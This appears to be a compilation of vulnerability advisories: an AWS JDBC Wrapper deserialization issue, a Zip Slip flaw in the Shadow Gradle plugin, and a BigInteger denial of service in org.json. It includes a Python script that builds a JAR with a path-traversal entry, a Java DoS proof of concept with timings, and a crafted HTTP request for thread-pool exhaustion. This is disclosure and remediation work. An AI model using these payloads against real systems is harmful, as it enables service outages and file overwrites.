The AWS Advanced JDBC Wrapper is an open-source JDBC driver wrapper that extends a JDBC driver to enable Amazon Aurora and AWS Cloud features such as failover handling and caching. We identified CVE-2026-14265, an issue in the RemoteQueryCachePlugin of the AWS Advanced JDBC Wrapper. When this plugin is enabled, query results read from the shared Redis/Valkey cache are deserialized without class filtering. An actor with write access to the shared cache infrastructure could insert a crafted serialized Java object that, when read by an application, results in execution of arbitrary code on the application server.

Workarounds

The RemoteQueryCachePlugin is not enabled by default. Customers who cannot immediately upgrade can mitigate this issue by disabling the RemoteQueryCachePlugin, and by restricting write access to the Redis/Valkey cache infrastructure to trusted principals.

Summary

ShadowCopyAction in the Shadow plugin does not validate or sanitize ZIP entry names before writing them to the output fat JAR. A malicious upstream dependency containing path traversal sequences (e.g. ../../../../tmp/pwned.txt) in entry names will have those entries reproduced verbatim in the output shadow JAR.

Details

The vulnerability exists because Shadow relies entirely on Gradle's ZipFileTree for entry sanitization rather than implementing its own path validation. This means:

  1. Users on Gradle < 7.6.2 / 8.x < 8.2.0 are directly exploitable
  2. The produced shadow JAR becomes a Zip Slip weapon against any downstream consumer using unprotected extraction (raw ZipInputStream, older CI tooling, custom Java unpackers)
  3. If Shadow ever uses a non-ZipFileTree code path, protection disappears silently

Affected file: src/main/kotlin/com/github/jengelman/gradle/plugins/shadow/internal/ShadowCopyAction.kt

PoC

  1. Create a malicious JAR with path traversal entry:
import zipfile
with zipfile.ZipFile('evil.jar', 'w') as zf:
    zf.writestr('../../../../tmp/zipslip_proof.txt', 'pwned')
  1. Add as dependency in a shadow project
  2. Run gradle shadowJar
  3. Run unzip -l build/libs/*.jar | grep "\.\."
  4. Traversal entry survives in output JAR

Impact

Any tool extracting the shadow JAR with unprotected extraction is subject to arbitrary file overwrite. Users on older Gradle versions are directly vulnerable at build time.

1. Executive Summary

JSON-java version 20260522 contains an unguarded path from an HTTP request body to unbounded BigInteger and BigDecimal construction. JSONTokener.nextSimpleValue() accumulates numeric characters into a StringBuilder with no length cap, then passes the full string to JSONObject.stringToNumber(), which calls new BigInteger(val) or new BigDecimal(val) directly. Both constructors have polynomial time complexity (O(n^1.585) for BigInteger).

A 488 KB JSON body — well within nginx's default 1 MB body-size limit — contains a 500,000-digit numeric literal that blocks the handling thread for approximately 3 seconds. Spring Boot has no default size limit for application/json request bodies. No parser configuration option (withStrictMode, withKeepStrings) prevents this. All three primary entry points are affected: new JSONObject(String), new JSONArray(String), and XML.toJSONObject(String).

This vulnerability is distinct from CVE-2023-5072 (which addressed StackOverflowError from deeply nested JSON structures via a try/catch in nextValue()) and from CVE-2022-45688 (which addressed recursive XML nesting depth). The numeric string length issue has been present since BigInteger support was introduced in release 20150729 and has never been fixed in any subsequent release.

Attack Complexity is rated High because successful exploitation requires the target application to be using org.json specifically (rather than the default Jackson library used by Spring Boot), and requires the developer to have explicitly passed user-controlled input to new JSONObject() or equivalent. These are deployment conditions beyond the attacker's control. See Section 6 for the full CVSS rationale and Section 8 for the comparison with Jackson's treatment of the same issue class.

This vulnerability was reproduced locally against json-20260522.jar with full evidence provided below.

2. Vulnerability Description

JSONTokener.nextSimpleValue() accumulates characters into a StringBuilder with no length limit until it hits a structural JSON character:

JSONTokener.java:500–504:

StringBuilder sb = new StringBuilder();
while (c >= ' ' && ",:]}/\\\"[{;=#".indexOf(c) < 0) {
    sb.append(c);     // unbounded — no length check
    c = this.next();
}

The accumulated string is passed to JSONObject.stringToValue() → stringToNumber(), which calls new BigInteger(val) with zero size guard:

JSONObject.java:2738:

BigInteger bi = new BigInteger(val);   // val can be arbitrarily large; no guard

BigInteger(String) has O(n^1.585) time complexity due to its internal Karatsuba multiplication during construction. A 100,000-digit input takes ~120 ms; a 1,000,000-digit input takes ~12 seconds. The decimal path (new BigDecimal(val), reached when the string contains a . or exponent) is equally affected.

No configuration option prevents this. withStrictMode(true) and withKeepStrings(true) are not checked in the nextSimpleValue() → stringToNumber() call chain. Confirmed by execution: both options still produce BigInteger in ~120 ms for a 100K-digit input.

Relationship to CVE-2023-5072: CVE-2023-5072 (fixed in release 20231013) catches StackOverflowError thrown by deeply nested JSON structures ({[ brackets) inside nextValue():

} catch (StackOverflowError e) {
    throw new JSONException("JSON Array or Object depth too large to process.", e);
}

This fix is in nextValue() and covers only recursive object/array structure depth. It has no effect on the numeric string length path in nextSimpleValue() → stringToNumber(). The BigInteger length issue was not addressed in 20231013 or in any subsequent release.

3. Affected Code Locations

File Lines Description
JSONTokener.java 500–504 nextSimpleValue() — unbounded character accumulation into StringBuilder, no length cap
JSONObject.java 2721–2748 stringToNumber() — new BigInteger(val) / new BigDecimal(val) called directly with no length guard

4. Proof of Concept (Locally Verified)

4.1 POC Code

import org.json.*;

public class Poc2NumericDoSv2 {
    public static void main(String[] args) {
        System.out.println("=== CVE-002: JSONTokener Unbounded Numeric String DoS ===");

        // Scaling: timing at different digit counts
        System.out.println("\n-- Unquoted numeric literal (JSONObject) --");
        int[] sizes = {10_000, 100_000, 200_000, 500_000, 1_000_000};
        for (int numLen : sizes) {
            String payload = "{\"x\":" + "9".repeat(numLen) + "}";
            long start = System.currentTimeMillis();
            JSONObject jo = new JSONObject(payload);
            long elapsed = System.currentTimeMillis() - start;
            System.out.printf("  %,7d digits (~%3d KB): %,5d ms  type=%s%n",
                numLen, payload.length()/1024, elapsed, jo.get("x").getClass().getSimpleName());
        }

        // All affected entry points
        System.out.println("\n-- All affected entry points (100K digits) --");
        String p = "9".repeat(100_000);
        long t;
        t = System.currentTimeMillis(); new JSONObject("{\"n\":" + p + "}");
        System.out.println("  new JSONObject(String):     " + (System.currentTimeMillis()-t) + " ms");
        t = System.currentTimeMillis(); new JSONArray("[" + p + "]");
        System.out.println("  new JSONArray(String):      " + (System.currentTimeMillis()-t) + " ms");
        t = System.currentTimeMillis(); XML.toJSONObject("<r>" + p + "</r>");
        System.out.println("  XML.toJSONObject(String):   " + (System.currentTimeMillis()-t) + " ms");

        // No configuration option prevents the DoS
        System.out.println("\n-- Configuration bypass attempts (100K digits) --");
        String payload100k = "{\"n\":" + p + "}";
        t = System.currentTimeMillis();
        new JSONObject(payload100k, new JSONParserConfiguration().withStrictMode(true));
        System.out.println("  withStrictMode(true):       " + (System.currentTimeMillis()-t) + " ms  [no protection]");
        t = System.currentTimeMillis();
        new JSONObject(payload100k, new JSONParserConfiguration().withKeepStrings(true));
        System.out.println("  withKeepStrings(true):      " + (System.currentTimeMillis()-t) + " ms  [no protection]");

        System.out.println("\nRESULT: [CONFIRMED VULNERABLE] No length guard exists in parsing chain.");
    }
}

4.2 Actual Execution Evidence (Reproduced Against json-20260522.jar)

=== CVE-002: JSONTokener Unbounded Numeric String DoS ===

-- Unquoted numeric literal (JSONObject) --
   10,000 digits (~  9 KB):    17 ms  type=BigInteger
  100,000 digits (~ 97 KB):   123 ms  type=BigInteger
  200,000 digits (~195 KB):   479 ms  type=BigInteger
  500,000 digits (~488 KB): 2,975 ms  type=BigInteger
  1,000,000 digits (~976 KB): 11,909 ms  type=BigInteger

-- All affected entry points (100K digits) --
  new JSONObject(String):     121 ms
  new JSONArray(String):      120 ms
  XML.toJSONObject(String):   123 ms

-- Configuration bypass attempts (100K digits) --
  withStrictMode(true):       121 ms  [no protection]
  withKeepStrings(true):      124 ms  [no protection]

RESULT: [CONFIRMED VULNERABLE] No length guard exists in parsing chain.

Key observations:

  • All three primary entry points (JSONObject, JSONArray, XML.toJSONObject) are equally affected
  • Neither withStrictMode(true) nor withKeepStrings(true) reduces the delay
  • A 488 KB payload produces a ~3 second thread blockage
  • Scaling is super-linear: doubling digits from 500K to 1M increases parse time approximately 4× (consistent with O(n^1.585))

5. Attack Scenarios

5.1 Thread-Pool Exhaustion via Concurrent Requests

A Java web application that explicitly uses org.json for request body parsing exposes a JSON endpoint. The developer parses the request body with new JSONObject(requestBody).

Single attack request:

POST /api/order HTTP/1.1
Host: target.example.com
Content-Type: application/json
Content-Length: 500011

{"amount":999...999}   (500,000 nines — ~488 KB body)

Effect: This single request occupies one Tomcat thread for ~3 seconds. To exhaust a default 200-thread Tomcat pool, the attacker sends 200 concurrent such requests — a total of ~95 MB of concurrent traffic (200 × 488 KB), achievable with any standard load-generation tool (ab, wrk, hey). While those threads are occupied, legitimate user requests queue and time out.

Why common defaults do not prevent this:

  • nginx default client_max_body_size = 1 MB → 488 KB payload passes through
  • Spring Boot has no default size limit for application/json @RequestBody (Tomcat's maxPostSize applies only to application/x-www-form-urlencoded and multipart/form-data, not to JSON)
  • No configuration option within org.json itself provides any protection

5.2 Amplification Ratio

The blocking time grows super-linearly with payload size, creating an asymmetric attack:

Payload size Thread blockage Ratio (ms per KB sent)
9 KB (10K digits) 17 ms 1.9 ms/KB
97 KB (100K digits) 123 ms 1.3 ms/KB
195 KB (200K digits) 479 ms 2.5 ms/KB
488 KB (500K digits) ~2,975 ms 6.1 ms/KB
976 KB (1M digits) ~11,909 ms 12.2 ms/KB

A 488 KB request — well within nginx's 1 MB default — ties up a server thread for 3 seconds. The ratio of CPU time consumed to bytes sent grows with payload size due to Karatsuba's super-linear complexity.

5.3 All Primary Entry Points Are Affected

The vulnerability is not limited to new JSONObject(String). Any org.json parsing call on the same numeric input produces the same delay:

new JSONObject(String):     121 ms  (for 100K digits)
new JSONArray(String):      120 ms  (for 100K digits)
XML.toJSONObject(String):   123 ms  (for 100K digits)

Any endpoint that parses user-controlled JSON or XML through org.json is a potential target, regardless of which specific API method is used.

7. Remediation

Primary fix — nextSimpleValue() in JSONTokener.java:

Add a numeric token length cap in the accumulation loop, configurable via JSONParserConfiguration. The guard must fire before the string is passed to stringToNumber():

// In JSONTokener.nextSimpleValue(), inside the while loop (line 501):
if (sb.length() > jsonParserConfiguration.getMaxNumberLength()) {
    throw this.syntaxError("Numeric literal exceeds maximum allowed length of "
        + jsonParserConfiguration.getMaxNumberLength());
}

Expose the limit in JSONParserConfiguration:

private int maxNumberLength = 1_000;  // matches Jackson's DEFAULT_MAX_NUM_LEN

public JSONParserConfiguration withMaxNumberLength(int maxNumberLength) {
    JSONParserConfiguration newConfig = this.clone();
    newConfig.maxNumberLength = maxNumberLength;
    return newConfig;
}
public int getMaxNumberLength() { return this.maxNumberLength; }

A safe default of 1,000 characters matches the StreamReadConstraints.DEFAULT_MAX_NUM_LEN value introduced in Jackson 2.15 (released April 2023) specifically to address this class of vulnerability. org.json has no equivalent protection as of version 20260522.

Defense-in-depth (application-level): Configure an upstream body size limit independent of any library fix. For nginx: client_max_body_size 64k;. For Spring Boot: register a CommonsRequestLoggingFilter or a OncePerRequestFilter that caps Content-Length before the body reaches the controller. These measures reduce the maximum achievable digit count but do not eliminate the root cause and should not be treated as a substitute for a library-level fix.

8. Comparison with Jackson's Treatment of the Same Issue

Jackson 2.15.0 (released April 2023) introduced StreamReadConstraints.withMaxNumberLength() with a default limit of 1,000 digits to address this exact class of vulnerability — and did so without a CVE being filed. This raises a legitimate question: if the Jackson ecosystem handled the same issue without a CVE, why does org.json warrant one?

The two situations are materially different in three ways:

1. Jackson's fix was universal and automatic; org.json's omission is not.

Jackson is the default JSON library in Spring Boot. When Jackson 2.15 shipped with DEFAULT_MAX_NUM_LEN = 1000, the protection was automatically applied to the entire Spring Boot ecosystem without any developer action. Every Spring Boot application upgrading to Spring Boot 3.1+ received the protection transparently.

org.json has no equivalent protection in any version through 20260522. Applications using org.json receive no protection from any upstream fix and have no configurable option to enable it. There is no automatic upgrade path.

2. org.json has an established CVE precedent for the same DoS class.

This project has already been assigned CVEs for resource-exhaustion vulnerabilities triggered by crafted parsing input:

  • CVE-2022-45688: XML recursive nesting DoS
  • CVE-2023-5072: JSON nested {[ structure DoS

Both were assigned under the same root pattern: parser accepts unbounded user-controlled input, resulting in resource exhaustion. The numeric string length issue is the same pattern in the same library, in a code path that the two prior fixes explicitly left unaddressed. Treating this as a non-CVE while the two structurally identical prior issues were assigned CVEs would be inconsistent.

3. RFC 8259 explicitly permits — and implicitly recommends — setting limits on number length.

RFC 8259 §6 states: "This specification allows implementations to set limits on the range and precision of numbers accepted." The RFC anticipates that secure implementations will impose such limits. org.json's NOTES.md acknowledges only "partial support" for BigInteger/BigDecimal, but provides no size guard and no documentation warning users of the DoS risk. The absence of a documented security boundary in the presence of an RFC-permitted and industry-standard protection mechanism constitutes an exploitable implementation deficiency.

9. Relationship to Prior CVEs

CVE Fixed In Root Cause Code Path Fix Applied
CVE-2022-45688 20230227 XML recursive nesting → StackOverflow in XML.parse() XML.java recursive parse() calls Added maxNestingDepth parameter (default 512) in ParserConfiguration

This report Unfixed Unbounded numeric string → O(n^1.585) BigInteger/BigDecimal construction nextSimpleValue() → stringToNumber() → new BigInteger(val) None

The three issues share the "resource exhaustion during parsing" symptom but have entirely separate root causes, code paths, and fixes. Neither prior CVE provides any protection against numeric string length attacks.
